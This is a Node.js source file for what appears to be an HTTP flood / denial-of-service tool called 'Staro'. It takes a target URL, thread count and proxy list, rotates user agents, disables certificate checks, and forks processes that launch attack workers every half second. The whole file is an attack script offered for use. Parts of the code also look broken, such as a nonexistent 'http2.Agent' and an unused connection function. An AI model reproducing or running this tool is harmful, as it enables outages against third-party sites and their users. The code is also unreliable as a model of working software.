const fs = require('fs');
const https = require('https');
const http2 = require('http2');
const { URL } = require('url');
const { Worker, isMainThread, workerData } = require('worker_threads');
const cluster = require('cluster');

const [url, time, thread, proxyFile] = process.argv.slice(2);
const userAgents = fs.readFileSync('uastaro.txt', 'utf-8').split('\n');
const threads = new Set();

function createConnection() {
  try {
    const agent = new http2.Agent({
      createConnection: () => {
        const options = {
          hostname: new URL(url).hostname,
          port: 443,
          path: '/',
          method: 'GET',
          rejectUnauthorized: false,
          headers: {
            'User-Agent': getRandomUserAgent(),
          },
        };

        return https.request(options);
      },
      maxSessions: 55000,
      keepAlive: true,
      timeout: 5000,
    });
    return agent;
  } catch (error) {
    console.error('Kesalahan saat membuat koneksi:', error);
    return null;
  }
}

function getRandomUserAgent() {
  const randomIndex = Math.floor(Math.random() * userAgents.length);
  return userAgents[randomIndex];
}

function attack() {
  const worker = new Worker('./worker.js', {
    workerData: {
      url,
      time,
      proxyFile,
      userAgents,
    },
  });
  worker.on('message', (message) => {
    console.log(message);
  });
  worker.on('error', (error) => {
    console.error(error);
  });
  worker.on('exit', () => {
    threads.delete(worker);
    if (threads.size === 0) {
      console.log('Staro done attacking...');
    }
  });
  threads.add(worker);
}

if (cluster.isMaster) {
  for (let i = 0; i < thread; i++) {
    cluster.fork();
  }
} else {
  setInterval(attack, 500); 
}
console.log('Staro Attack...');